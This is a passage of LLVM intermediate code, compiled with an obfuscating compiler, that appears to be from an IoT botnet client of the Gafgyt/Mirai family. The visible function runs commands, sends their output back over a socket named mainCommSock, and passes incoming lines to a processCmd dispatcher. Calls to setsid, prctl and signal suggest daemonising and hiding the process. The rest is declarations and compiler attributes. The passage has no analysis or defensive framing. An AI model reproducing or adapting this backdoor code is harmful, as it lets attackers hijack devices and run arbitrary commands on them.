  %193 = load i32, i32* @mainCommSock, align 4
  %194 = call i32 (i32, i8*, ...) @sockprintf(i32 %193, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.556, i64 0, i64 0), i8* nonnull %188)
  call void @llvm.memset.p0i8.i64(i8* nonnull %188, i8 0, i64 1024, i32 16, i1 false)
  %195 = call i32 @sleep(i32 1) #3
  %196 = call i8* @fdgets(i8* nonnull %188, i32 1024, i32 %190)
  %197 = icmp eq i8* %196, null
  br i1 %197, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %187
  %198 = call i32 @fdpclose(i32 %190)
  call void @exit(i32 0) #17
  unreachable

; <label>:199:                                    ; preds = %._crit_edge136
  %200 = call i8* @strtok(i8* %172, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i64 0, i64 0)) #3
  store i8* %161, i8** %76, align 16
  %201 = icmp eq i8* %200, null
  br i1 %201, label %._crit_edge141.thread, label %.lr.ph140.preheader

.lr.ph140.preheader:                              ; preds = %199
  br label %.lr.ph140

._crit_edge141.thread:                            ; preds = %199
  call void @processCmd(i32 1, i8** nonnull %76)
  br label %.backedge

.lr.ph140:                                        ; preds = %.lr.ph140.preheader, %214
  %.087138 = phi i8* [ %215, %214 ], [ %200, %.lr.ph140.preheader ]
  %.088137 = phi i32 [ %.1, %214 ], [ 1, %.lr.ph140.preheader ]
  %202 = load i8, i8* %.087138, align 1
  %203 = icmp eq i8 %202, 10
  br i1 %203, label %214, label %204

; <label>:204:                                    ; preds = %.lr.ph140
  %205 = call i64 @strlen(i8* nonnull %.087138) #15
  %206 = add i64 %205, 1
  %207 = call noalias i8* @malloc(i64 %206) #3
  %208 = sext i32 %.088137 to i64
  %209 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 %208
  store i8* %207, i8** %209, align 8
  %210 = call i64 @strlen(i8* nonnull %.087138) #15
  %211 = add i64 %210, 1
  call void @llvm.memset.p0i8.i64(i8* %207, i8 0, i64 %211, i32 1, i1 false)
  %212 = call i8* @strcpy(i8* %207, i8* nonnull %.087138) #3
  %213 = add nsw i32 %.088137, 1
  br label %214

; <label>:214:                                    ; preds = %.lr.ph140, %204
  %.1 = phi i32 [ %213, %204 ], [ %.088137, %.lr.ph140 ]
  %215 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i64 0, i64 0)) #3
  %216 = icmp eq i8* %215, null
  br i1 %216, label %._crit_edge141, label %.lr.ph140

._crit_edge141:                                   ; preds = %214
  call void @processCmd(i32 %.1, i8** nonnull %76)
  %217 = icmp sgt i32 %.1, 1
  br i1 %217, label %.lr.ph144.preheader, label %.backedge

.lr.ph144.preheader:                              ; preds = %._crit_edge141
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph144

.lr.ph144:                                        ; preds = %.lr.ph144.preheader, %.lr.ph144
  %indvars.iv158 = phi i64 [ %indvars.iv.next159, %.lr.ph144 ], [ 1, %.lr.ph144.preheader ]
  %218 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 %indvars.iv158
  %219 = load i8*, i8** %218, align 8
  call void @free(i8* %219) #3
  %indvars.iv.next159 = add nuw nsw i64 %indvars.iv158, 1
  %exitcond = icmp eq i64 %indvars.iv.next159, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph144
}

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fputs(i8* nocapture readonly, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146579359}
!2 = !{i32 -2146577974}
!3 = !{i32 -2146577214}
!4 = !{i32 -2146576391}
!5 = distinct !{!5, !6}
!6 = !{!"llvm.loop.unroll.disable"}
!7 = !{i32 -2146575484}
